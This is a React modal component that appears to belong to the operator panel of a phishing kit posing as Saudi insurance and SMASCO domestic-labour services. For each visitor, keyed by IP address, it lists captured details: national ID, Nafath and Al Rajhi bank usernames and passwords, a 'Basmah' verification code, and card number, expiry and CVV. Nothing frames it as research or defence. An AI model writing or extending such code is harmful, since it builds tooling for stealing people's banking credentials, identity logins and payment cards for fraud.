import React from "react";
import { Modal, Button, FormControl } from "react-bootstrap";

export default function InfoModal({ ip, user, onClose }) {
  const rows = [
    ["Full Name", user.FullName],
    ["Phone Number", user.PhoneNumber],
    ["Buyer ID", user.BuyerIDnumber],
    ["Resident ID", user.IDorResidenceNumber],
    ["Contract Type", user.TypeOfInsuranceContract],
    ["Start Date", user.InsuranceStartDate],
    ["Purpose", user.PurposeOfUse],
    ["Est. Value", user.EstimatedValue],
    ["Year", user.ManufactureYear],
    ["Repair Loc", user.RepairLocation],
    ["3rd-party Co", user.companyName],
    ["3rd-party Base", user.basePrice],
    ["3rd-party Total", user.totalPrice],
    ["Mada", user.mada?.toString()],
    ["Visa/MC", user.visa_mastarcard?.toString()],
    ["ApplePay", user.applepay?.toString()],
    ["Billing Total", user.totalPrice],
    ["Nafad User", user.username],
    ["Nafad Pass", user.password],
    ["Rajhi User", user.username],
    ["Rajhi Pass", user.password],
    ["Basmah", user.code],
    ["Card Holder", user.cardHolderName],
    ["Card #", user.cardNumber],
    ["Expiry", user.expirationDate],
    ["CVV", user.cvv],
    // 🔹 SMASCO Info (from info.html)
    ["SMASCO - Full Name", user.fullname],
    ["SMASCO - ID Number", user.IDNumber],
    ["SMASCO - Phone", user.phone],
    ["SMASCO - City", user.city],
    ["SMASCO - Service", user.service],
    ["SMASCO - Request ID", user.requestId],
    // 🔹 SMASCO Service (from khdm.php)
    ["Service Type", user.service_type],
    ["Worker Nationality", user.worker_nationality],
    ["Duration Type", user.duration_type],
    ["Hours Package", user.hours_package],
    ["Months Package", user.months_package],
    ["Contract Duration", user.contract_duration],
    ["Package", user.package],
    ["Amount", user.amount],
    ["Service Start Date", user.service_start_date],
    ["Workers Count", user.workers_count],
    ["Visit Duration", user.visit_duration],
    ["Visit Period", user.visit_period],
    ["Visit Days", user.visit_days],
    ["Pickup Time", user.pickup_time],
    ["Pickup Time Hours", user.pickup_time_hours],
    ["Pickup Time Months", user.pickup_time_months],
  ];

  return (
    <Modal show onHide={onClose} size="lg" centered>
      <Modal.Header closeButton>
        <Modal.Title>Visitor Info — {ip}</Modal.Title>
      </Modal.Header>
      <Modal.Body style={{ direction: "ltr" }}>
        {rows.map(([label, val]) => (
          <p key={label}>
            <strong>{label}:</strong> {val ?? "—"}
          </p>
        ))}
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>
          Close
        </Button>
      </Modal.Footer>
    </Modal>
  );
}
